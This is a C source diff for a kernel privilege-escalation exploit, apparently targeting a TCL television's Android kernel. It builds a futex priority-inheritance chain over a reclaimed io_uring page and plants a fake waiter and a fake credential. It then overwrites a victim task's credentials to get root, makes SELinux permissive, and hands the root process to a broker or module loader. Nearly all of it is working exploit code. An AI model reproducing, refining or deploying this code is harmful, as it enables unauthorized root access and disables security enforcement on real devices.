@@ -9,6 +9,7 @@
 #include "offsets.h"
 #include <sys/ioctl.h>
 #include <sys/mman.h>
+#include <poll.h>
 #ifdef __ANDROID__
 #include <sys/system_properties.h>
 #else
@@ -30,8 +31,19 @@ static inline int __system_property_get(const char *name, char *value) {
 #include <sys/utsname.h>
 #include "tcl_v643/mcast_helper_protocol.h"
 #include "tcl_v643/capture_witness.h"
+#include "tcl_v643/compat_select_geometry.h"
 
 const struct kernel_offsets *active_offsets = NULL;
+/* V643 mode-7 can either use the historical clean NULL store (which also
+ * clears selinux_state.initialized) or a one-child store whose pointer bytes
+ * keep initialized non-zero while temporarily replacing policycap[0..4].
+ * The latter is the only form armed by default on the television and makes
+ * a verified live-policy reload mandatory before enforcing is restored. */
+static uintptr_t g_selinux_stamp_value;
+/* Set only while W2 targets a separate pre-spawned process.  The exploit
+ * coordinator must then remain unprivileged; credential normalization is
+ * performed later by the victim's ordinary fork(). */
+static int g_tcl_external_cred_target;
 
 /* Select symbol, address-space and structure offsets in every translation
  * unit, not just main.c. */
@@ -77,6 +89,9 @@ static int print_profile_info(const char *release_override) {
       break;
     case GHOST_STACK_OVERLAY_TCL_V643_MCAST_COMPAT:
       stack_route = "tcl-v643-mcast-arm32-compat";
+      break;
+    case GHOST_STACK_OVERLAY_TCL_V643_NEWSELECT_COMPAT:
+      stack_route = "tcl-v643-newselect-arm32-compat";
       break;
   }
   printf("stack_overlay_route=%s\n", stack_route);
@@ -127,7 +142,7 @@ static int select_offsets(void) {
       if (candidate->analysis_only) {
 #if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
         if (candidate->stack_overlay_route ==
-                GHOST_STACK_OVERLAY_TCL_V643_MCAST_COMPAT &&
+                GHOST_STACK_OVERLAY_TCL_V643_NEWSELECT_COMPAT &&
             candidate->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT) {
           pr_warning("LAB ARMING: accepting integrated TCL V643 profile; "
                      "this build must not be run on the TV before the "
@@ -597,6 +612,10 @@ struct tcl_split_run {
   pid_t helper_pid;
 };
 
+/* The first TCL write keeps the proven 50 ms timing. Same-page reuse may
+ * increase this after a clean carrier miss; it never starts another reclaim. */
+static int g_tcl_split_settle_usec = 50000;
+
 extern int g_route_write_ok;
 extern int g_selinux_off;
 extern int g_hit_block;
@@ -640,37 +659,129 @@ static void *tcl_split_owner(void *opaque) {
   struct tcl_split_run *run = opaque;
   struct tcl_v643_mcast_shared *s = run->shared;
   disable_rseq_for_thread();
+  if (access("/dev/glqemu-root", F_OK) == 0)
+    (void)prctl(PR_SET_NAME, "glqemu-owner", 0, 0, 0);
+  else
+    (void)prctl(PR_SET_NAME, "tcl_gl_owner", 0, 0, 0);
+  atomic_store_explicit(&s->owner_tid, (uint32_t)syscall(__NR_gettid),
+                        memory_order_release);
   if (futex_op(&s->f_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
     atomic_fetch_add(&s->failures, 1);
     return NULL;
   }
   while (!atomic_load(&s->waiter_ready)) sched_yield();
   atomic_store(&s->owner_started, 1);
-  if (futex_op(&s->f_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
+  struct timespec deadline;
+  clock_gettime(CLOCK_REALTIME, &deadline);
+  deadline.tv_sec += 2;
+  errno = 0;
+  long owner_ret = futex_op(&s->f_chain, FUTEX_LOCK_PI, 0,
+                            &deadline, NULL, 0);
+  s->diag_owner_ret = (int32_t)owner_ret;
+  s->diag_owner_errno = errno;
+  if (owner_ret != -1 || errno != ETIMEDOUT)
     atomic_fetch_add(&s->failures, 1);
-  else
+  atomic_store_explicit(&s->owner_abort_done, 1, memory_order_release);
+  if (owner_ret == 0)
     (void)futex_op(&s->f_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   (void)futex_op(&s->f_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   return NULL;
 }
 
-static void *tcl_split_consumer(void *opaque) {
+/* Last userspace fail-closed check before the priority change enters the PI
+ * chain.  This cannot inspect the stale on-stack waiter, but it prevents a
+ * partially re-armed reclaimed page from reaching rt_mutex_top_waiter(). */
+static int tcl_validate_captured_w0(void) {
+  uint8_t *pg = uring_block(g_tcl_capture_block);
+  if (!pg) {
+    pr_error("TCL prefire: captured block %d is not mapped\n",
+             g_tcl_capture_block);
+    return 0;
+  }
+
+  uint64_t lock_root = *(volatile uint64_t *)(
+      pg + LOCK_OFF + RT_MUTEX_WAITERS_OFF);
+  uint64_t lock_left = *(volatile uint64_t *)(
+      pg + LOCK_OFF + RT_MUTEX_WAITERS_OFF + 8);
+  uint64_t lock_owner = *(volatile uint64_t *)(
+      pg + LOCK_OFF + RT_MUTEX_OWNER_OFF);
+  uint64_t w0_parent = *(volatile uint64_t *)(pg + W0_OFF + 0x00);
+  uint64_t w0_right = *(volatile uint64_t *)(pg + W0_OFF + 0x08);
+  uint64_t w0_left = *(volatile uint64_t *)(pg + W0_OFF + 0x10);
+  uint64_t w0_task = *(volatile uint64_t *)(
+      pg + W0_OFF + FAKE_WAITER_TASK_OFF);
+  uint64_t w0_lock = *(volatile uint64_t *)(
+      pg + W0_OFF + FAKE_WAITER_LOCK_OFF);
+  uint64_t w0_pi_pc = *(volatile uint64_t *)(
+      pg + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+
+  int ok = lock_root == fake_w0 && lock_left == fake_w0 &&
+           lock_owner == (fake_task | 1) &&
+           w0_parent == 0 && w0_right == 0 && w0_left == 0 &&
+           w0_task == fake_task && w0_lock == fake_lock && w0_pi_pc != 0;
+  if (!ok) {
+    pr_error("TCL prefire REFUSED block=%d lock[root=%016llx left=%016llx owner=%016llx] W0[parent=%016llx right=%016llx left=%016llx task=%016llx lock=%016llx pi_pc=%016llx] expected[w0=%016lx task=%016lx lock=%016lx]\n",
+             g_tcl_capture_block,
+             (unsigned long long)lock_root,
+             (unsigned long long)lock_left,
+             (unsigned long long)lock_owner,
+             (unsigned long long)w0_parent,
+             (unsigned long long)w0_right,
+             (unsigned long long)w0_left,
+             (unsigned long long)w0_task,
+             (unsigned long long)w0_lock,
+             (unsigned long long)w0_pi_pc,
+             (unsigned long)fake_w0,
+             (unsigned long)fake_task,
+             (unsigned long)fake_lock);
+  }
+  return ok;
+}
+
+/* The owner expires naturally while the helper is provably blocked inside
+ * _newselect.  Its ordinary FUTEX_LOCK_PI timeout cleanup calls
+ * remove_waiter(), observes the helper waiter's stale pi_blocked_on and
+ * performs the PI walk.  This avoids a signal frame on either critical
+ * kernel stack. */
+static void *tcl_split_verifier(void *opaque) {
   struct tcl_split_run *run = opaque;
   struct tcl_v643_mcast_shared *s = run->shared;
   disable_rseq_for_thread();
-  pin_to_core(CONSUMER_CORE);
   if (!wait_atomic_nonzero(&s->round_go, 5000)) {
     atomic_fetch_add(&s->failures, 1);
     atomic_store(&s->round_done, 1);
+    return NULL;
+  }
+  if (!atomic_load_explicit(&s->carrier_observed, memory_order_acquire)) {
+    pr_error("TCL split: _newselect carrier was not observed live; refusing PI verification\n");
+    atomic_fetch_add(&s->failures, 1);
+    atomic_store_explicit(&s->round_done, 1, memory_order_release);
+    return NULL;
+  }
+
+  if (!tcl_validate_captured_w0()) {
+    atomic_fetch_add(&s->failures, 1);
+    atomic_store_explicit(&s->round_done, 1, memory_order_release);
+    return NULL;
+  }
+
+  uint32_t owner_tid = atomic_load_explicit(&s->owner_tid,
+                                             memory_order_acquire);
+  long sr = 0;
+  int sched_errno = 0;
+  if (!wait_atomic_nonzero(&s->owner_abort_done, 5000)) {
+    pr_error("TCL owner-timeout walk failed tid=%u done=%u\n",
+             owner_tid,
+             atomic_load_explicit(&s->owner_abort_done,
+                                  memory_order_acquire));
+    atomic_fetch_add(&s->failures, 1);
+    atomic_store_explicit(&s->round_done, 1, memory_order_release);
     return NULL;
   }
 
   uint8_t *first = uring_block(0);
   uint64_t armed = first ? *(volatile uint64_t *)(
       first + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF) : 0;
-  errno = 0;
-  long sr = sched_setattr_tid((int)atomic_load(&s->helper_tid), 7);
-  int sched_errno = errno;
   int found = -1;
   uint64_t cleared = page_base + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF;
   for (int b = 0; ; b++) {
@@ -683,12 +794,14 @@ static void *tcl_split_consumer(void *opaque) {
       break;
     }
   }
-  pr_info("TCL split diag: sched_ret=%ld errno=%d found=%d "
-          "armed=%016llx cleared=%016llx mcast_ret=%d mcast_errno=%d "
+  pr_info("TCL split diag: owner_timeout_wait=%ld errno=%d "
+          "owner_futex_ret=%d owner_errno=%d found=%d "
+          "armed=%016llx cleared=%016llx carrier_ret=%d carrier_errno=%d "
           "wait_ret=%d wait_errno=%d disarm_errno=%d\n",
-          sr, sched_errno, found, (unsigned long long)armed,
-          (unsigned long long)cleared, s->diag_mcast_ret,
-          s->diag_mcast_errno, s->diag_wait_ret, s->diag_wait_errno,
+          sr, sched_errno, s->diag_owner_ret, s->diag_owner_errno, found,
+          (unsigned long long)armed,
+          (unsigned long long)cleared, s->diag_carrier_ret,
+          s->diag_carrier_errno, s->diag_wait_ret, s->diag_wait_errno,
           s->diag_disarm_errno);
   if (sr == 0 && found >= 0 && found != g_tcl_capture_block) {
     pr_error("TCL split: erase changed block %d, witness proved block %d\n",
@@ -747,6 +860,7 @@ static int tcl_create_shared(struct tcl_v643_mcast_shared **out, int *out_fd) {
   s->message.magic = TCL_V643_MCAST_HELPER_MAGIC;
   s->message.version = TCL_V643_MCAST_HELPER_VERSION;
   s->message.size = sizeof(s->message);
+  s->message.flags = TCL_V643_HELPER_CARRIER_NEWSELECT;
   s->message.fake_task = fake_task;
   s->message.fake_lock = fake_lock;
   s->message.wake_state = 3;
@@ -758,7 +872,7 @@ static int tcl_create_shared(struct tcl_v643_mcast_shared **out, int *out_fd) {
 
 static int run_tcl_v643_split_route(void) {
   struct tcl_split_run run = {0};
-  pthread_t owner, consumer;
+  pthread_t owner, verifier;
   int fd = -1, status = 0;
   if (!tcl_capture_may_arm(g_tcl_capture_status, g_tcl_capture_block)) {
     pr_error("TCL split: no confirmed capture witness; refusing to create the chain\n");
@@ -786,7 +900,7 @@ static int run_tcl_v643_split_route(void) {
     goto fail;
   }
   if (pthread_create(&owner, NULL, tcl_split_owner, &run) != 0 ||
-      pthread_create(&consumer, NULL, tcl_split_consumer, &run) != 0) {
+      pthread_create(&verifier, NULL, tcl_split_verifier, &run) != 0) {
     pr_error("TCL split: coordinator thread creation failed\n");
     goto fail;
   }
@@ -794,13 +908,18 @@ static int run_tcl_v643_split_route(void) {
     pr_error("TCL split: helper waiter did not enter WAIT_REQUEUE_PI\n");
     goto fail_threads;
   }
+  if (!wait_atomic_nonzero(&run.shared->waiter_observed, 2000)) {
+    pr_error("TCL split: helper leader could not prove live WAIT_REQUEUE_PI\n");
+    goto fail_threads;
+  }
+  pr_info("TCL split: compat waiter observed in FUTEX_WAIT_REQUEUE_PI\n");
   for (int i = 0; i < 2000 && !(run.shared->f_chain & FUTEX_WAITERS); i++)
     usleep(1000);
   if (!(run.shared->f_chain & FUTEX_WAITERS)) {
     pr_error("TCL split: owner is not queued on chain futex\n");
     goto fail_threads;
   }
-  usleep(50000);
+  usleep((useconds_t)g_tcl_split_settle_usec);
   errno = 0;
   long rr = futex_op(&run.shared->f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                      (void *)1, &run.shared->f_target, 0);
@@ -816,7 +935,7 @@ static int run_tcl_v643_split_route(void) {
     goto fail_threads;
   }
 
-  pthread_join(consumer, NULL);
+  pthread_join(verifier, NULL);
   pthread_join(owner, NULL);
   waitpid(run.helper_pid, &status, 0);
   run.helper_pid = 0;
@@ -851,12 +970,13 @@ void run_main_route_threads(void) {
   reset_main_route_state();
   if (active_offsets &&
       active_offsets->stack_overlay_route ==
-          GHOST_STACK_OVERLAY_TCL_V643_MCAST_COMPAT) {
+          GHOST_STACK_OVERLAY_TCL_V643_NEWSELECT_COMPAT) {
     if (!run_tcl_v643_split_route()) {
       g_route_write_ok = 0;
       return;
     }
-    if (pselect_custom_write == WRITE_MODE_CRED) {
+    if (pselect_custom_write == WRITE_MODE_CRED &&
+        !g_tcl_external_cred_target) {
       long gr = syscall(__NR_setresgid, 0, 0, 0);
       long ur = syscall(__NR_setresuid, 0, 0, 0);
       if (gr != 0 || ur != 0 || syscall(__NR_getuid) != 0) {
@@ -1049,7 +1169,10 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
   ghost_reset_plans();
   g_route_write_ok = 0;
   pselect_child_node = 1;
-  set_pselect_write_mode(target, 0, mode);
+  set_pselect_write_mode(target,
+                         mode == WRITE_MODE_CRED_SELINUX
+                             ? g_selinux_stamp_value : 0,
+                         mode);
   TIMER("  heap spray start");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
   if (!page_base) {
@@ -1090,6 +1213,58 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
   return 1;
 }
 
+/* Reuse the page already captured and pinned by the TCL W2 credential
+ * write.  Starting a second mm_struct reclaim after a live raw-root victim
+ * exists proved unsafe on the television: the extra SLUB churn can panic
+ * before the second write is even armed.  The split AArch32 carrier is
+ * deliberately one-erase-per-lifetime, so create a fresh carrier but only
+ * re-arm the quiesced waiter/lock fields in the existing io_uring mapping.
+ * Do not rebuild the full payload: the fake credential on this page is live
+ * in the W2 victim and must retain its reference state. */
+static int do_tcl_reuse_captured_write(uintptr_t target, uintptr_t value,
+                                       const char *desc, int mode) {
+  pr_info("=== %s (reuse captured W2 page) === target=0x%016zx mode=%d\n",
+          desc, target, mode);
+  ghost_reset_plans();
+  g_route_write_ok = 0;
+  pselect_child_node = 1;
+  set_pselect_write_mode(target, value, mode);
+  int attempts = env_int_range("TCL_REUSE_ATTEMPTS", 3, 1, 5);
+  int force_retry = env_flag("TCL_REUSE_FORCE_RETRY", 0);
+  for (int attempt = 1; attempt <= attempts; attempt++) {
+    g_route_write_ok = 0;
+    if (!ghost_rearm_captured_write(target, value)) {
+      pr_warning("TCL same-page re-arm failed attempt=%d/%d\n",
+                 attempt, attempts);
+      break;
+    }
+    pr_info("TCL same-page carrier attempt=%d/%d settle_us=%d\n",
+            attempt, attempts, 50000 + (attempt - 1) * 30000);
+    TIMER("  captured page re-armed");
+    /* A fresh compat helper is used for every attempt.  No reclaim and no
+     * new kernel allocation target are introduced: a clean carrier miss is
+     * allowed to unwind completely, then the quiesced captured page is
+     * re-armed.  The increasing settle only changes when the already armed
+     * PI chain receives its signal. */
+    g_tcl_split_settle_usec = 50000 + (attempt - 1) * 30000;
+    run_main_route_threads();
+    if (g_route_write_ok) {
+      if (force_retry && attempt == 1) {
+        pr_info("TCL same-page forced retry gate: first landing accepted "
+                "then re-armed for regression\n");
+        g_route_write_ok = 0;
+        continue;
+      }
+      break;
+    }
+    pr_warning("TCL same-page carrier miss attempt=%d/%d; retrying "
+               "without reclaim\n", attempt, attempts);
+  }
+  g_tcl_split_settle_usec = 50000;
+  clear_pselect_write();
+  return g_route_write_ok;
+}
+
 static int check_selinux_off(void) {
   int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
   if (efd < 0) return 1;
@@ -1097,6 +1272,37 @@ static int check_selinux_off(void) {
   read(efd, b, sizeof(b));
   close(efd);
   return b[0] == '0';
+}
+
+/* Post-root fail-safe used by the direct broker handoff.  Keep this path
+ * libc-free: the exploit threads may still own inconsistent libc locks.
+ * The broker normally restores enforcing as soon as the manager app
+ * connects; if that handshake never happens, the root parent closes the
+ * permissive window itself before exiting. */
+static int raw_selinux_enforcing(void) {
+  long fd = syscall(__NR_openat, AT_FDCWD,
+                    "/sys/fs/selinux/enforce", O_RDONLY, 0);
+  if (fd < 0) return -1;
+  char value = '?';
+  long n = syscall(__NR_read, fd, &value, 1);
+  syscall(__NR_close, fd);
+  return n == 1 ? (value == '1') : -1;
+}
+
+/* Once the preserving rb_erase write has made SELinux permissive, a plain
+ * setenforce(1) is unsafe: the same eight-byte store temporarily replaces
+ * policycap[0..4].  Only a normalized helper may reload and verify the live
+ * policy before closing the window.  A raw-task failure therefore reboots;
+ * if reboot is unavailable it parks forever and keeps the reclaimed page
+ * pinned instead of enabling enforcement with corrupted network policy. */
+static void raw_emergency_reboot_or_park(void) {
+  (void)syscall(__NR_sync);
+  (void)syscall(__NR_reboot, LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2,
+                LINUX_REBOOT_CMD_RESTART, NULL);
+  for (;;) {
+    struct timespec pause = {.tv_sec = 3600, .tv_nsec = 0};
+    (void)syscall(__NR_nanosleep, &pause, NULL);
+  }
 }
 
 static int write_selinux_policy_fix_script(void) {
@@ -1968,7 +2174,19 @@ static int perf_leak_selinux_state(uintptr_t *out) {
   return nrank;
 }
 
-struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
+struct tcl_victim_control {
+  atomic_uint command_seq;
+  atomic_uint response_seq;
+  atomic_uint task_ready;
+  uint32_t command;
+  uint32_t response;
+  uintptr_t task;
+};
+
+struct child_pipes {
+  int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w;
+  struct tcl_victim_control *control;
+};
 static void child_main(struct child_pipes *p);
 
 static void child_main(struct child_pipes *p) {
@@ -2015,6 +2233,455 @@ static pid_t spawn_child(struct child_pipes *p) {
   return child;
 }
 
+/* TCL's credential is built inside the reclaimed io_uring page.  A normal
+ * pre-exploit fork would not inherit the descriptors opened later by the
+ * reclaim, and the credential would become a dangling pointer when the
+ * exploit parent exits.  The dedicated victim therefore shares only the
+ * file table (not the address space or thread group) with the parent.  Its
+ * later ordinary fork() both normalizes cred/real_cred through copy_creds()
+ * and copies the now-populated file table into the broker worker. */
+static void park_tcl_root_victim(void) {
+  int fd = open("/proc/self/oom_score_adj", O_WRONLY | O_CLOEXEC);
+  if (fd >= 0) {
+    (void)write(fd, "-1000", 5);
+    close(fd);
+  }
+  for (;;) pause();
+}
+
+static void tcl_shared_victim_main(struct child_pipes *p) {
+  char broker_path[512] = {0};
+  char broker_uid[16] = "1000";
+  char broker_name[80] = "tcl_root_broker_test";
+  char resukisu_handoff[512] = {0};
+  char resukisu_preflight[512] = {0};
+  char resukisu_ksud[512] = {0};
+  char resukisu_module[512] = {0};
+  char resukisu_status[512] = {0};
+  const char *v;
+
+  /* Cache all strings while the task still has its original credential. */
+  v = getenv("GHOST_DIRECT_BROKER");
+  if (!v || !v[0]) v = getenv("TCL_QEMU_SESSION_BROKER");
+  if (v && v[0]) snprintf(broker_path, sizeof(broker_path), "%s", v);
+  v = getenv("GHOST_BROKER_UID");
+  if (v && v[0]) snprintf(broker_uid, sizeof(broker_uid), "%s", v);
+  v = getenv("GHOST_BROKER_ABSTRACT");
+  if (!v || !v[0]) v = getenv("TCL_QEMU_SESSION_NAME");
+  if (v && v[0]) snprintf(broker_name, sizeof(broker_name), "%s", v);
+  v = getenv("GHOST_RESUKISU_HANDOFF");
+  if (v && v[0]) snprintf(resukisu_handoff, sizeof(resukisu_handoff), "%s", v);
+  v = getenv("GHOST_RESUKISU_PREFLIGHT");
+  if (v && v[0]) snprintf(resukisu_preflight, sizeof(resukisu_preflight), "%s", v);
+  v = getenv("GHOST_RESUKISU_KSUD");
+  if (v && v[0]) snprintf(resukisu_ksud, sizeof(resukisu_ksud), "%s", v);
+  v = getenv("GHOST_RESUKISU_MODULE");
+  if (v && v[0]) snprintf(resukisu_module, sizeof(resukisu_module), "%s", v);
+  v = getenv("GHOST_RESUKISU_STATUS");
+  if (v && v[0]) snprintf(resukisu_status, sizeof(resukisu_status), "%s", v);
+
+  (void)setpgid(0, 0);
+  (void)prctl(PR_SET_NAME, "tcl_gl_victim", 0, 0, 0);
+
+  /* A false perf winner would turn W2 into an arbitrary kernel write.  Two
+   * independent samples must agree exactly before the address is published. */
+  uintptr_t my_task = perf_find_task();
+  int agreed = 0;
+  for (int i = 0; i < 2 && my_task; i++) {
+    uintptr_t again = perf_find_task();
+    if (again == my_task) {
+      agreed = 1;
+      break;
+    }
+    my_task = again;
+  }
+  if (!agreed) my_task = 0;
+  p->control->task = my_task;
+  atomic_thread_fence(memory_order_release);
+  atomic_store_explicit(&p->control->task_ready, 1, memory_order_release);
+  if (!my_task) _exit(1);
+
+  /* Do not block in a pipe read while W2 replaces task->cred.  On the TCL
+   * kernel that in-flight read returns an internal error after the cred
+   * transition, although the same sequence succeeds under QEMU.  Commands
+   * and replies therefore use this MAP_SHARED atomic mailbox.  The short
+   * raw nanosleep only yields the CPU; its return value is irrelevant. */
+  uint32_t seen_seq = 0;
+  int broker_requested = 0;
+  for (;;) {
+    uint32_t command_seq;
+    do {
+      command_seq = atomic_load_explicit(&p->control->command_seq,
+                                         memory_order_acquire);
+      if (command_seq == seen_seq) {
+        struct timespec pause = {.tv_sec = 0, .tv_nsec = 1000000};
+        (void)syscall(__NR_nanosleep, &pause, NULL);
+      }
+    } while (command_seq == seen_seq);
+    char cmd = (char)p->control->command;
+    seen_seq = command_seq;
+
+    if (cmd == 'C') {
+      uint32_t uid = (uint32_t)syscall(__NR_getuid);
+      p->control->response = uid;
+      atomic_thread_fence(memory_order_release);
+      atomic_store_explicit(&p->control->response_seq, seen_seq,
+                            memory_order_release);
+    } else if (cmd == 'P') {
+      uint32_t report = 0x50494e47u; /* "PING" */
+      p->control->response = report;
+      atomic_thread_fence(memory_order_release);
+      atomic_store_explicit(&p->control->response_seq, seen_seq,
+                            memory_order_release);
+    } else if (cmd == 'U') {
+      errno = 0;
+      long rc = syscall(__NR_unshare, CLONE_FILES);
+      uint32_t report = rc == 0 ? 0x554e5348u : (uint32_t)errno;
+      p->control->response = report;
+      atomic_thread_fence(memory_order_release);
+      atomic_store_explicit(&p->control->response_seq, seen_seq,
+                            memory_order_release);
+    } else if (cmd == 'G') {
+      broker_requested = 1;
+      break;
+    } else if (cmd == 'X') {
+      if (getuid() == 0) {
+        if (raw_selinux_enforcing() != 1)
+          raw_emergency_reboot_or_park();
+        park_tcl_root_victim();
+      }
+      _exit(1);
+    }
+  }
+
+  /* Only an explicit G may cross this boundary. */
+  int resukisu_requested = resukisu_handoff[0] && resukisu_preflight[0] &&
+                           resukisu_ksud[0] && resukisu_module[0] &&
+                           resukisu_status[0];
+  if (!broker_requested || syscall(__NR_getuid) != 0 ||
+      (!broker_path[0] && !resukisu_requested))
+    _exit(121);
+
+  /* Do not exec from this raw victim: task->cred is the fake credential but
+   * task->real_cred is still the original one.  fork() invokes copy_creds(),
+   * producing a worker whose two pointers reference one legitimate copied
+   * credential.  Because this process shares the exploit parent's file
+   * table, that worker also inherits the io_uring descriptors which keep the
+   * fake credential and its supporting objects alive. */
+  int completion_pipe[2] = {-1, -1};
+  if (resukisu_requested && pipe(completion_pipe) != 0) {
+    raw_emergency_reboot_or_park();
+  }
+
+  pid_t worker = fork();
+  if (worker == 0) {
+    char holder_pid[16];
+    snprintf(holder_pid, sizeof(holder_pid), "%d", (int)getppid());
+    (void)setsid();
+    if (resukisu_requested) {
+      char completion_fd[16];
+      close(completion_pipe[0]);
+      snprintf(completion_fd, sizeof(completion_fd), "%d",
+               completion_pipe[1]);
+      execl(resukisu_handoff, resukisu_handoff,
+            "--direct-child", "--preflight", resukisu_preflight,
+            "--ksud", resukisu_ksud, "--module", resukisu_module,
+            "--status", resukisu_status,
+            "--completion-fd", completion_fd, (char *)NULL);
+      _exit(127);
+    }
+    execl(broker_path, broker_path,
+          "--direct-child", "--uid", broker_uid,
+          "--abstract", broker_name,
+          "--arm-timeout-ms", "60000",
+          "--holder-pid", holder_pid,
+          "--reboot-after-ms", "45000", (char *)NULL);
+    _exit(127);
+  }
+  if (resukisu_requested) close(completion_pipe[1]);
+  uint32_t report = worker > 0 ? (uint32_t)worker : 0;
+  p->control->response = report;
+  atomic_thread_fence(memory_order_release);
+  atomic_store_explicit(&p->control->response_seq, seen_seq,
+                        memory_order_release);
+  if (worker < 0) {
+    if (completion_pipe[0] >= 0) close(completion_pipe[0]);
+    raw_emergency_reboot_or_park();
+  }
+
+  /* ReSukiSU is a one-shot handoff, not a long-lived broker.  Keep the W2
+   * reclaim descriptors pinned while the normalized helper completes its
+   * policy/network repair, module load and enforcing restoration.  The raw
+   * victim must remain parked afterwards too: exit_creds() would otherwise
+   * release a credential still backed by the reclaimed page.  Reboot is the
+   * sole cleanup boundary. */
+  if (resukisu_requested && worker > 0) {
+    /* waitpid() is not a lifetime primitive for the raw W2 task: TCL has
+     * already shown that a syscall in flight across the credential rewrite
+     * can return an internal error.  The normalized helper therefore owns
+     * the only write end of this post-W2 pipe.  Its close-on-exec flag keeps
+     * the fd out of preflight/ksud, and EOF proves the helper itself has
+     * exited before the reclaim page is released. */
+    char completion;
+    for (;;) {
+      long n = syscall(__NR_read, completion_pipe[0], &completion, 1);
+      if (n == 0 || n == 1) break;
+      if (n < 0 && errno == EINTR) continue;
+      struct timespec pause = {.tv_sec = 0, .tv_nsec = 1000000};
+      (void)syscall(__NR_nanosleep, &pause, NULL);
+    }
+    close(completion_pipe[0]);
+    int status = 0;
+    while (waitpid(worker, &status, 0) < 0) {
+      if (errno == EINTR) continue;
+      park_tcl_root_victim();
+    }
+    int worker_rc = WIFEXITED(status) ? WEXITSTATUS(status)
+                                     : (WIFSIGNALED(status)
+                                            ? 128 + WTERMSIG(status)
+                                            : 125);
+    /* Never infer from a return code that policycap/netlink repair happened:
+     * argument, exec and early-kernel guards can fail before that point. */
+    if (worker_rc != 0)
+      raw_emergency_reboot_or_park();
+    park_tcl_root_victim();
+  }
+
+  /* Stop retaining the Java/native launcher's stdout pipe.  unshare first:
+   * close() on the still-shared table would also close the parent's fds.
+   * The private copy continues to pin every reclaim descriptor. */
+  if (syscall(__NR_unshare, CLONE_FILES) == 0) {
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+  }
+
+  /* The raw victim owns the shared descriptor table and intentionally stays
+   * alive for the volatile session.  Reboot is the cleanup boundary. */
+  park_tcl_root_victim();
+}
+
+static pid_t spawn_tcl_shared_victim(struct child_pipes *p,
+                                     uintptr_t *task_out) {
+  p->task_r = p->task_w = p->cmd_r = p->cmd_w = -1;
+  p->uid_r = p->uid_w = -1;
+  p->control = mmap(NULL, sizeof(*p->control), PROT_READ | PROT_WRITE,
+                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+  if (p->control == MAP_FAILED) {
+    p->control = NULL;
+    return -1;
+  }
+  memset(p->control, 0, sizeof(*p->control));
+
+  long child = syscall(__NR_clone, (unsigned long)(CLONE_FILES | SIGCHLD),
+                       0, 0, 0, 0);
+  if (child < 0) return -1;
+  if (child == 0) {
+    tcl_shared_victim_main(p);
+    _exit(1);
+  }
+
+  uintptr_t task = 0;
+  /* Software-emulated QEMU needs roughly 30-45 s per perf sample storm;
+   * the television completes it much faster. */
+  for (int i = 0; i < 180000; i++) {
+    if (atomic_load_explicit(&p->control->task_ready,
+                             memory_order_acquire)) {
+      atomic_thread_fence(memory_order_acquire);
+      task = p->control->task;
+      break;
+    }
+    struct timespec pause = {.tv_sec = 0, .tv_nsec = 1000000};
+    (void)nanosleep(&pause, NULL);
+  }
+  *task_out = task;
+  if (!task) {
+    uint32_t seq = atomic_load_explicit(&p->control->command_seq,
+                                        memory_order_relaxed) + 1;
+    p->control->command = 'X';
+    atomic_thread_fence(memory_order_release);
+    atomic_store_explicit(&p->control->command_seq, seq,
+                          memory_order_release);
+  }
+  return (pid_t)child;
+}
+
+static void tcl_log_victim_wait_state(pid_t victim_pid, const char *stage) {
+  int status = 0;
+  errno = 0;
+  pid_t wr = waitpid(victim_pid, &status, WNOHANG);
+  int saved_errno = errno;
+  if (wr == 0) {
+    pr_warning("TCL W2 IPC %s: victim pid=%d is alive but did not reply\n",
+               stage, victim_pid);
+  } else if (wr == victim_pid && WIFEXITED(status)) {
+    pr_warning("TCL W2 IPC %s: victim pid=%d exited status=%d\n",
+               stage, victim_pid, WEXITSTATUS(status));
+  } else if (wr == victim_pid && WIFSIGNALED(status)) {
+    pr_warning("TCL W2 IPC %s: victim pid=%d killed by signal=%d\n",
+               stage, victim_pid, WTERMSIG(status));
+  } else {
+    pr_warning("TCL W2 IPC %s: waitpid=%d errno=%d\n",
+               stage, (int)wr, saved_errno);
+  }
+}
+
+static int tcl_victim_word(struct child_pipes *p, pid_t victim_pid,
+                           char command, uint32_t *word_out,
+                           const char *stage) {
+  if (!p->control) {
+    pr_warning("TCL W2 IPC %s: shared mailbox unavailable\n", stage);
+    tcl_log_victim_wait_state(victim_pid, stage);
+    return 0;
+  }
+
+  uint32_t seq = atomic_load_explicit(&p->control->command_seq,
+                                      memory_order_relaxed) + 1;
+  if (!seq) seq = 1;
+  p->control->command = (uint32_t)(unsigned char)command;
+  atomic_thread_fence(memory_order_release);
+  atomic_store_explicit(&p->control->command_seq, seq,
+                        memory_order_release);
+
+  for (int i = 0; i < 5000; i++) {
+    if (atomic_load_explicit(&p->control->response_seq,
+                             memory_order_acquire) == seq) {
+      atomic_thread_fence(memory_order_acquire);
+      *word_out = p->control->response;
+      return 1;
+    }
+    struct timespec pause = {.tv_sec = 0, .tv_nsec = 1000000};
+    (void)nanosleep(&pause, NULL);
+  }
+
+  pr_warning("TCL W2 IPC %s: shared mailbox timeout command_seq=%u "
+             "response_seq=%u\n", stage, seq,
+             atomic_load_explicit(&p->control->response_seq,
+                                  memory_order_acquire));
+  tcl_log_victim_wait_state(victim_pid, stage);
+  return 0;
+}
+
+static void tcl_victim_send(struct child_pipes *p, char command) {
+  if (!p->control) return;
+  uint32_t seq = atomic_load_explicit(&p->control->command_seq,
+                                      memory_order_relaxed) + 1;
+  if (!seq) seq = 1;
